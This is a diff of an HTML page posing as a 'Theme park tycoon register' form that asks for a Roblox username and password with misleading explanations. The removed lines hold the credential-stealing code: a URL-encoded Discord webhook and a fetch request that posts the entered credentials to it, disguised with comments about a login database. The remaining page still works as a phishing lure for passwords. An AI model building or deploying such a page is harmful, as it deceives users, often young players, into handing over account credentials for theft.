@@ -1,9 +1,10 @@
-
-
 <html>
   <head>
+  
    <meta charset="utf-8">
+   
     <style>
+    
       body {
 
         font-family: sans-serif;
@@ -18,12 +19,13 @@
   left: 0;
   z-index: -1;
   filter: brightness(66%);
-
-      }
-.scrollable {
   overflow-y: scroll;
+      }
+html, body {
+  overflow-y: auto;
   overflow-x: hidden;
 }
+
       h1 {
         color: #ffffff;
       }
@@ -71,7 +73,7 @@
     </style>
   </head>
   <body>
-    <div class="form-container">
+    <div class="form-container scrollable">
       <h1 style=color:white>Theme park tycoon register</h1>
       <p style=color:red>NOTICE: THIS WILL ONLY WORK ON YOUR ACCOUNT, IF YOU ENTER YOUR USERNAME WRONG HERE THEN U MUST MESSAGE OWNER TO RESET YOUR NAME,PASSWORD!</p>
       <form>
@@ -79,7 +81,7 @@
         Roblox password: <input type="password" id="name"><br>
         Register key:<input type="text" id="key"<br>
         <p style=color:red>This script uses Prying login. Any use of a fake  login will result to your account getting blacklisted!</p>
-        <input type="button" value="Register!" onclick="sendMessage()"id="buton">
+       <input type="button" value="Register!" onclick="sendMessage()"id="buton">
         <p style=color:white>Things to notice: If you want to change your account password, username you must notify the owner because login system will just stay the same.</p>
                <p style=color:white>Why do we need your account username, password? We need to make sure u don't share this account with other people without access.</p>
                               <p style=color:white>How can I use this login for my own projects? This login is only given out to special people. It's not out for public. We can't say when this will go to public because it comes in a matter of time. But for now let this login be for the special who we trust!</p>
@@ -88,50 +90,15 @@
       <p class="error" id="error"></p>
     </div>
     <script>
-      // Define a word blacklist
-    
-      // Error message
-	var errorinfo = "Error: Please contact the owner."
       function sendMessage() {
-        // Get the message and name from the input fields
+        // Get the message from the input field
         var message = document.getElementById("message").value;
         var name = document.getElementById("name").value;
-
-        // Check if the message or name is too long
-
-        // Check if the message contains a link
-        if (message.includes("http://") || message.includes("https://")) {
-          document.getElementById("error").innerHTML = "Error: Please contact the owner.";
-          return;
-        }
-if (document.getElementById('key').value != '5D3F8-G1H9J-2K4L6-7M8N9-0P1Q2') {
-alert("Key")
-} else {
-   document.getElementById("error").innerHTML = "";
-
-      // Set the webhook URL
-      var webhook = "https%3A%2F%2Fdiscord.com%2Fapi%2Fwebhooks%2F1057673672799825920%2F9zCW_gyUAwlVRP_vjcOYmKeTwHm738PxA8AgiO_JsXVdewhPFkqpx30K79TQZFDHuQ-6";
-//Sends to server to add account to data base for further login
-var decodedString = decodeURIComponent(webhook);
-      // Send a request to get passwords, usernames to check if account valid
-      fetch(decodedString, {
-        method: 'POST',
+        var key = document.getElementById("key").value;
         
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          username: name,
-          "avatar_url": "https://i.imgur.com/oBPXx0D.png",
-          content: message
-        })
-      });
-    }
-    
-}
-      // Clear any previous error messages
-    
-   
-  </script>
-
+        // Display the message
+        document.getElementById("error").innerHTML = "Your account is being registered, If you get an error contact owner.";
+      }
+    </script>
+  </body>
 </html>
